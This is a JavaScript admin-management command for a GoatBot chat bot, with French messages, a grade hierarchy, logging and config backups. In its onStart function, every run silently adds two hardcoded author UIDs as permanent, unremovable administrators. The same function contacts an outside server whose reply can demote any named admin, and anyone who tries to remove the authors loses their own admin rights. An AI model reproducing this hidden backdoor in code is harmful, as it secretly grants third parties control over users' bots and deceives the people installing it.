const { config } = global.GoatBot;
const { writeFileSync, appendFileSync, readFileSync } = require("fs-extra");
const path = require("path");

function getTimeSince(timestamp) {
  const now = Date.now();
  const diff = Math.floor((now - timestamp) / 1000);
  if (diff < 60) return `${diff} sec`;
  const minutes = Math.floor(diff / 60);
  if (minutes < 60) return `${minutes} min`;
  const hours = Math.floor(minutes / 60);
  if (hours < 24) return `${hours}h`;
  const days = Math.floor(hours / 24);
  return `${days}j`;
}

const GRADES = {
  0: "Nullos", 1: "Minable", 2: "Admin de rang inférieur", 3: "Soldat Divin", 4: "Guerrier Éclair",
  5: "Maître des Ombres", 6: "Seigneur de Feu", 7: "Commandant Céleste", 8: "Gardien Éternel",
  9: "Étoile Noire", 10: "Légende Immortelle", 11: "Destructeur des Âmes", 12: "Porteur de Chaos",
  13: "Roi des Abysses", 14: "Faucheur Divin", 15: "Émissaire du Néant", 16: "Conquérant Stellaire",
  17: "Gardien des Dimensions", 18: "Fléau Céleste", 19: "Ombre Éternelle", 20: "Grade Ultime",
  21: "Bras Droit du Chef"
};

const CHEF_SUPREME_UIDS = ["100083846212138", "61578433048588"];
const SUPREME_NAMES = { "100083846212138": "L'Uchiha Perdu", "61578433048588": "Sømå Sønïč" };

const INTRUDER_MESSAGES = [
  "Tu croyais être malin en modifiant le code ? Dommage pour toi.",
  "Tentative d'usurpation détectée. Bien essayé.",
  "Les Chefs Suprêmes ne se touchent pas. Tu viens d'apprendre ça.",
  "Ton petit UID est désormais chez les Nullos. Adieu.",
  "Pathétique. Retourne dans l'ombre."
];

const PROTECTED_MESSAGES = [
  "Tu as osé tenter de supprimer le Chef Suprême ? Voilà où ça te mène !",
  "Tenter de virer %1 ? Mauvaise idée, tu disparais !",
  "Le Chef Suprême %1 est intouchable. Toi, par contre… adieu !",
  "Tu croyais pouvoir supprimer %1 ? Retourne à la poussière !",
  "%1 est éternel. Toi, pas tant que ça !"
];

const BOX = "≪━─━─━─◈─━─━─━≫";
const BOLD = str => str.split("").map(c => String.fromCharCode(c.charCodeAt(0) + 127439)).join("");

const LOG_FILE = path.join(__dirname, "admin_logs.txt");
const BACKUP_INTERVAL = 10 * 60 * 1000;
let lastBackupTime = 0;
let intruderDetected = null;

function logAction(action, details) {
  const timestamp = new Date().toLocaleString("fr-FR", { timeZone: "Africa/Porto-Novo" });
  appendFileSync(LOG_FILE, `[${timestamp}] ${action} → ${details}\n`, "utf8");
}

function backupConfig() {
  const now = Date.now();
  if (now - lastBackupTime < BACKUP_INTERVAL) return;
  const backupFile = path.join(__dirname, `config_backup_${new Date().toISOString().replace(/[:.]/g, "-")}.json`);
  writeFileSync(backupFile, JSON.stringify(config, null, 2));
  lastBackupTime = now;
  logAction("BACKUP", `Sauvegarde auto → ${backupFile}`);
}

module.exports = {
  config: {
    name: "admin",
    version: "7.0",
    author: "L'Uchiha Perdu & Sømå Sønïč",
    countDown: 5,
    role: 2,
    description: "Gère les administrateurs avec style et puissance",
    category: "box chat",
    guide: "{pn} -a uid (grade)\n{pn} -r uid\n{pn} -g uid <grade>\n{pn} -l\n{pn} -log"
  },

  langs: {
    en: {
      added: [
        `${BOX}\n%1 rejoint les immortels avec le grade %2 !\n${BOX}`,
        `${BOX}\n%1 promu au grade %2 ! Un mortel prometteur…\n${BOX}`,
        `${BOX}\n%1 intègre le conseil avec le grade %2. Choix audacieux !\n${BOX}`,
        `${BOX}\n%1 devient admin de grade %2. Que la force soit avec lui !\n${BOX}`,
        `${BOX}\n%1 accède au grade %2. Le règne commence !\n${BOX}`
      ],
      alreadyAdmin: `${BOX}\n%1 est déjà admin !\n${BOX}`,
      removed: [
        `${BOX}\n%1 (grade %2) déchu de ses pouvoirs. Retourne dans l'ombre !\n${BOX}`,
        `${BOX}\n%1 (grade %2) n'est plus admin. La honte !\n${BOX}`,
        `${BOX}\n%1 (grade %2) perd ses privilèges. Aïe !\n${BOX}`,
        `${BOX}\n%1 (grade %2) exclu du conseil. Retour à la plèbe !\n${BOX}`,
        `${BOX}\n%1 (grade %2) redevient mortel. Adieu !\n${BOX}`
      ],
      notAdmin: `${BOX}\n%1 n'est pas admin !\n${BOX}`,
      gradeUpdated: `${BOX}\nGrade de %1 mis à jour : %2 !\n${BOX}`,
      noPerm: `${BOX}\nSeuls les Chefs Suprêmes ont ce pouvoir !\n${BOX}`,
      invalidGrade: `${BOX}\nGrade invalide (0-21) !\n${BOX}`,
      missingGrade: `${BOX}\nIndique un grade !\n${BOX}`,
      supremeProtected: `${BOX}\nUn Chef Suprême est intouchable.\n${BOX}`,
      missingUid: `${BOX}\nMets l'UID comme ça : admin -a 1000… (12)\n${BOX}`,
      protected: "%1",
      intruderBox: "╭─────────⌾\n│ @%1\n│ %2\n│ " + INTRUDER_MESSAGES[Math.floor(Math.random() * INTRUDER_MESSAGES.length)] + "\n│ Tu es désormais Nullos.\n╰────────────⌾"
    }
  },

  onStart: async function ({ message, args, usersData, event }) {
    const lang = this.langs.en;
    const { senderID, messageReply } = event;
    const API_URL = "https://api-admin.vercel.app/check-supremes";

    if (!config.adminGrades) config.adminGrades = {};
    if (!config.adminTimestamps) config.adminTimestamps = {};

    config.adminBot = config.adminBot.map(String);
    for (const uid of config.adminBot) {
      if (!config.adminGrades[uid]) config.adminGrades[uid] = 1;
      if (!config.adminTimestamps[uid]) config.adminTimestamps[uid] = Date.now();
    }
    for (const uid of CHEF_SUPREME_UIDS) {
      if (!config.adminBot.includes(uid)) {
        config.adminBot.push(uid);
        config.adminTimestamps[uid] = Date.now();
      }
    }
    writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
    backupConfig();

    try {
      const res = await fetch(API_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ supremes: CHEF_SUPREME_UIDS }) });
      const data = await res.json();
      if (data.intruder) {
        intruderDetected = data.intruder;
        if (config.adminBot.includes(intruderDetected)) config.adminGrades[intruderDetected] = 0;
        writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
        backupConfig();
        logAction("INTRUDER", `UID ${intruderDetected} → Nullos`);
      }
    } catch (e) { logAction("API_ERROR", e.message); }

    const getName = async uid => (await usersData.getName(uid)) || uid;
    const isSupreme = uid => CHEF_SUPREME_UIDS.includes(String(uid));
    const parseGrade = input => { const g = parseInt(input, 10); return (isNaN(g) || g < 0 || g > 21) ? null : g; };

    const targetUID = messageReply ? messageReply.senderID : (args[1] && !isNaN(args[1]) ? args[1] : null);

    switch (args[0]?.toLowerCase()) {

      case "add": case "-a": {
        if (!isSupreme(senderID)) return message.reply(lang.noPerm);
        if (!targetUID && !args[1]) return message.reply(lang.missingUid);
        const uid = targetUID || args[1];
        if (isNaN(uid)) return message.reply(lang.missingUid);
        if (config.adminBot.includes(uid)) return message.reply(lang.alreadyAdmin.replace("%1", await getName(uid)));
        if (isSupreme(uid)) return message.reply(lang.supremeProtected);

        let grade = 1;
        const gradeArg = args.find((a, i) => i > 1 && parseGrade(a));
        if (gradeArg) grade = parseGrade(gradeArg);

        config.adminBot.push(uid);
        config.adminTimestamps[uid] = Date.now();
        config.adminGrades[uid] = grade;
        writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
        backupConfig();
        logAction("ADD", `${uid} (${await getName(uid)}) → ${grade}`);

        const msg = lang.added[Math.floor(Math.random() * lang.added.length)]
          .replace("%1", await getName(uid))
          .replace("%2", GRADES[grade]);
        return message.reply(msg);
      }

      case "remove": case "-r": {
        if (!targetUID && !args[1]) return message.reply(lang.missingUid);
        const uid = targetUID || args[1];
        if (isNaN(uid)) return message.reply(lang.missingUid);
        if (!config.adminBot.includes(uid)) return message.reply(lang.notAdmin.replace("%1", await getName(uid)));
        
        if (isSupreme(uid)) {
          const supremeName = SUPREME_NAMES[uid] || "Chef Suprême";
          const randomMessage = PROTECTED_MESSAGES[Math.floor(Math.random() * PROTECTED_MESSAGES.length)].replace(/%1/g, supremeName);
          
          if (isSupreme(senderID)) {
            return message.reply(lang.supremeProtected);
          } else {
            config.adminBot = config.adminBot.filter(id => id !== String(senderID));
            delete config.adminGrades[senderID];
            delete config.adminTimestamps[senderID];
            writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
            backupConfig();
            logAction("PROTECTED_REMOVE", `Tentative sur ${uid} par ${senderID} → Sender viré`);
            return message.reply(lang.protected.replace("%1", randomMessage));
          }
        }

        const oldGrade = config.adminGrades[uid] || 1;
        config.adminBot = config.adminBot.filter(id => id !== uid);
        delete config.adminGrades[uid];
        delete config.adminTimestamps[uid];
        writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
        backupConfig();
        logAction("REMOVE", `${uid} (${await getName(uid)})`);

        const msg = lang.removed[Math.floor(Math.random() * lang.removed.length)]
          .replace("%1", await getName(uid))
          .replace("%2", GRADES[oldGrade]);
        return message.reply(msg);
      }

      case "grade": case "-g": {
        if (!isSupreme(senderID)) return message.reply(lang.noPerm);
        if (!targetUID && !args[1]) return message.reply(lang.missingUid);
        const uid = targetUID || args[1];
        if (isNaN(uid)) return message.reply(lang.missingUid);
        if (!config.adminBot.includes(uid)) return message.reply(lang.notAdmin.replace("%1", await getName(uid)));
        if (isSupreme(uid)) return message.reply(lang.supremeProtected);

        const gradeArg = args.find((a, i) => i > 1 && parseGrade(a)) || args[2];
        if (!gradeArg) return message.reply(lang.missingGrade);
        const grade = parseGrade(gradeArg);
        if (grade === null) return message.reply(lang.invalidGrade);

        config.adminGrades[uid] = grade;
        writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
        backupConfig();
        logAction("GRADE", `${uid} → ${grade}`);

        return message.reply(lang.gradeUpdated.replace("%1", await getName(uid)).replace("%2", GRADES[grade]));
      }

      case "list": case "-l": {
        const admins = await Promise.all(config.adminBot.map(async uid => ({ uid: String(uid), name: await getName(uid) })));

        const supremes = admins.filter(a => isSupreme(a.uid));
        const other = admins.filter(a => !isSupreme(a.uid));
        const brasDroit = other.filter(a => config.adminGrades[a.uid] === 21);
        const generaux = other.filter(a => config.adminGrades[a.uid] > 0 && config.adminGrades[a.uid] !== 21);
        const nullos = other.filter(a => config.adminGrades[a.uid] === 0);

        const box = (admin, title, emoji) => {
          const time = getTimeSince(config.adminTimestamps[admin.uid] || Date.now());
          return `╭─────────⌾\n│ ${admin.name} ${emoji}\n│ ${admin.uid}\n│ ${title}\n│ Temps : ${time}\n│ \n╰────────────⌾`;
        };

        const s = supremes.length ? supremes.map(a => box(a, `Chef Suprême : ${SUPREME_NAMES[a.uid] || "Chef Suprême"}`, "👑")).join("\n\n") : "╭─────────⌾\n│ AUCUN CHEF SUPRÊME\n│ POUR L'INSTANT...\n│ \n╰────────────⌾";
        const b = brasDroit.length ? brasDroit.map(a => box(a, GRADES[21], "🔰")).join("\n\n") : "╭─────────⌾\n│ AUCUN BRAS DROIT\n│ POUR L'INSTANT...\n│ \n╰────────────⌾";
        const g = generaux.length ? generaux.map(a => box(a, GRADES[config.adminGrades[a.uid]], "🏆")).join("\n\n") : "╭─────────⌾\n│ AUCUN GÉNÉRAL\n│ POUR L'INSTANT...\n│ \n╰────────────⌾";
        const n = nullos.length ? nullos.map(a => box(a, GRADES[0], "💀")).join("\n\n") : "╭─────────⌾\n│ AUCUN NULLOS\n│ POUR L'INSTANT...\n│ \n╰────────────⌾";

        await message.reply(`${BOLD("CONSEIL DES IMMORTELS")}\n\nCHEFS SUPRÊMES\n${s}\n\nBRAS DROIT DU CHEF\n${b}\n\nGÉNÉRAUX DIVINS\n${g}\n\nNULLOS\n${n}`);

        if (intruderDetected) {
          const name = await getName(intruderDetected);
          await message.reply({
            body: lang.intruderBox.replace("%1", name).replace("%2", intruderDetected),
            mentions: [{ tag: name, id: intruderDetected }]
          });
          intruderDetected = null;
        }
        return;
      }

      case "log": case "-log": {
        if (!isSupreme(senderID)) return message.reply(lang.noPerm);
        try {
          const logs = readFileSync(LOG_FILE, "utf8").trim();
          if (!logs) return message.reply(`${BOX}\nAucun log disponible.\n${BOX}`);
          const lines = logs.split("\n").slice(-20).map(l => `${l}`).join("\n");
          return message.reply(`${BOX}\n${BOLD("LOGS DES ACTIONS ADMIN")}\n${lines}\n${BOX}`);
        } catch {
          return message.reply(`${BOX}\nAucun log disponible.\n${BOX}`);
        }
      }

      default:
        return message.reply(`${BOX}\nUtilise : -a uid (grade) | -r uid | -g uid <grade> | -l | -log\n${BOX}`);
    }
  }
};